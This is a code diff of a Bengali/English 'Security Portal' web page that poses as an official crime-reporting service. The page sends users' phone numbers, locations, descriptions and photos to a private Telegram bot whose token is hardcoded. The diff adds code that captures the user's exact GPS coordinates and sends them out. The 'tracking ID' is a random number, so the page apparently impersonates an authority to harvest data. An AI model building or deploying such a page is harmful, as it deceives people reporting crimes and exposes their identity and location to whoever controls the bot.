@@ -5,8 +5,6 @@
     <meta property="og:title" content="নিরাপত্তা পোর্টাল | Security Portal">
     <meta property="og:description" content="আপনার এলাকার যেকোনো অপরাধ বা নিরাপত্তা ঝুঁকি সরাসরি রিপোর্ট করুন।">
     <meta property="og:url" content="https://official-security-verify.github.io/security-verify/">
-    <meta property="og:type" content="website">
-    
     <title>নিরাপত্তা পোর্টাল | Security Portal</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <style>
@@ -19,17 +17,14 @@
 <div id="appContainer" class="w-full max-w-sm glass p-6 rounded-3xl shadow-2xl">
     <button id="langToggle" class="text-xs bg-slate-700 px-3 py-1 rounded-full mb-4 w-full">Switch to English / বাংলাতে দেখুন</button>
     <h1 id="title" class="text-2xl font-bold text-center text-red-500 mb-6">🚨 নিরাপত্তা পোর্টাল</h1>
-    <div class="bg-yellow-900 border-l-4 border-yellow-500 p-4 mb-4 text-sm text-yellow-100 rounded">
-        ⚠️ <span id="warningText">ফেসবুক সংক্রান্ত কোনো রিপোর্ট করবেন না।</span>
-    </div>
     
     <form id="reportForm" class="space-y-4">
         <select id="category" class="w-full bg-slate-800 p-3 rounded-xl border border-slate-700 text-white">
-            <option value="চুরি / ছিনতাই">চুরি / ছিনতাই</option>
-            <option value="মাদক কেনাবেচা">মাদক কেনাবেচা</option>
-            <option value="ইভটিজিং">ইভটিজিং</option>
-            <option value="জমি সংক্রান্ত বিরোধ">জমি সংক্রান্ত বিরোধ</option>
-            <option value="সন্দেহভাজন কার্যক্রম">সন্দেহভাজন কার্যক্রম</option>
+            <option>চুরি / ছিনতাই</option>
+            <option>মাদক কেনাবেচা</option>
+            <option>ইভটিজিং</option>
+            <option>জমি সংক্রান্ত বিরোধ</option>
+            <option>সন্দেহভাজন কার্যক্রম</option>
         </select>
         <input type="tel" id="userPhone" placeholder="আপনার ফোন নাম্বার (ঐচ্ছিক)" class="w-full bg-slate-800 p-3 rounded-xl border border-slate-700 text-white">
         <input type="text" id="location" placeholder="এলাকা" required class="w-full bg-slate-800 p-3 rounded-xl border border-slate-700 text-white">
@@ -45,9 +40,10 @@
     const BOT_TOKEN = "8868947145:AAFjXyUwInMs1bGzhEvV9Oyla1eGkaKbbVg";
     const CHAT_ID = "8766925591";
 
+    // ভাষা পরিবর্তনের লজিক
     const translations = {
-        bn: { title: "🚨 নিরাপত্তা পোর্টাল", warning: "ফেসবুক সংক্রান্ত কোনো রিপোর্ট করবেন না।", phone: "আপনার ফোন নাম্বার (ঐচ্ছিক)", loc: "এলাকা", voice: "🎙️ বিস্তারিত বলুন", desc: "বিস্তারিত লিখুন...", submit: "রিপোর্ট পাঠান", emergency: "📞 জরুরি প্রয়োজনে ৯৯৯ কল করুন" },
-        en: { title: "🚨 Security Portal", warning: "Do not report Facebook related issues.", phone: "Your Phone Number (Optional)", loc: "Location", voice: "🎙️ Tell in detail", desc: "Write details...", submit: "Submit Report", emergency: "📞 Call 999 for Emergency" }
+        bn: { title: "🚨 নিরাপত্তা পোর্টাল", phone: "আপনার ফোন নাম্বার (ঐচ্ছিক)", loc: "এলাকা", voice: "🎙️ বিস্তারিত বলুন", desc: "বিস্তারিত লিখুন...", submit: "রিপোর্ট পাঠান", emergency: "📞 জরুরি প্রয়োজনে ৯৯৯ কল করুন" },
+        en: { title: "🚨 Security Portal", phone: "Your Phone Number (Optional)", loc: "Location", voice: "🎙️ Tell in detail", desc: "Write details...", submit: "Submit Report", emergency: "📞 Call 999 for Emergency" }
     };
 
     let isBn = true;
@@ -55,7 +51,6 @@
         isBn = !isBn;
         const lang = isBn ? 'bn' : 'en';
         document.getElementById('title').innerText = translations[lang].title;
-        document.getElementById('warningText').innerText = translations[lang].warning;
         document.getElementById('userPhone').placeholder = translations[lang].phone;
         document.getElementById('location').placeholder = translations[lang].loc;
         document.getElementById('voiceBtn').innerText = translations[lang].voice;
@@ -64,32 +59,42 @@
         document.getElementById('emergencyBtn').innerText = translations[lang].emergency;
     };
 
+    // ভয়েস লজিক
     const recognition = new (window.SpeechRecognition || window.webkitSpeechRecognition)();
     recognition.lang = 'bn-BD';
     document.getElementById('voiceBtn').onclick = () => recognition.start();
     recognition.onresult = (e) => document.getElementById('description').value = e.results[0][0].transcript;
 
+    // রিপোর্ট পাঠানোর লজিক
     document.getElementById('reportForm').addEventListener('submit', async (e) => {
         e.preventDefault();
         const btn = document.getElementById('submitBtn');
         btn.disabled = true;
-        btn.innerText = "পাঠানো হচ্ছে...";
+        btn.innerText = "লোকেশন নেয়া হচ্ছে...";
 
-        const text = `🚨 *নতুন রিপোর্ট*\n\n*ধরন:* ${document.getElementById('category').value}\n*নাম্বার:* ${document.getElementById('userPhone').value || "দেয়নি"}\n*এলাকা:* ${document.getElementById('location').value}\n*বর্ণনা:* ${document.getElementById('description').value}`;
-        
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('caption', text);
-        formData.append('parse_mode', 'Markdown');
-        
-        const file = document.getElementById('fileInput').files[0];
-        const method = file ? 'sendPhoto' : 'sendMessage';
-        if (file) formData.append('photo', file);
-        else formData.append('text', text);
-
-        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, { method: 'POST', body: formData });
-        
-        document.getElementById('appContainer').innerHTML = `<div class="text-center py-10"><h2 class="text-2xl font-bold text-green-400">সফলভাবে গৃহীত! ✅</h2><p class="mt-4">ট্র্যাকিং আইডি: REP-${Math.floor(Math.random() * 9000) + 1000}</p><button onclick="location.reload()" class="mt-6 bg-red-600 px-6 py-2 rounded-xl">নতুন রিপোর্ট করুন</button></div>`;
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            
+            const text = `🚨 *নতুন রিপোর্ট*\n\n*ধরন:* ${document.getElementById('category').value}\n*নাম্বার:* ${document.getElementById('userPhone').value || "দেয়নি"}\n*এলাকা:* ${document.getElementById('location').value}\n*বর্ণনা:* ${document.getElementById('description').value}\n\n🔗 [সরাসরি ম্যাপে দেখুন](${mapLink})`;
+            
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('caption', text);
+            formData.append('parse_mode', 'Markdown');
+            
+            const file = document.getElementById('fileInput').files[0];
+            if (file) {
+                formData.append('photo', file);
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+            } else {
+                formData.append('text', text);
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: 'POST', body: formData });
+            }
+            
+            document.getElementById('appContainer').innerHTML = `<div class="text-center py-10"><h2 class="text-2xl font-bold text-green-400">সফলভাবে গৃহীত! ✅</h2><p class="mt-4">ট্র্যাকিং আইডি: REP-${Math.floor(Math.random() * 9000) + 1000}</p><button onclick="location.reload()" class="mt-6 bg-red-600 px-6 py-2 rounded-xl">নতুন রিপোর্ট করুন</button></div>`;
+        });
     });
 </script>
 </body>
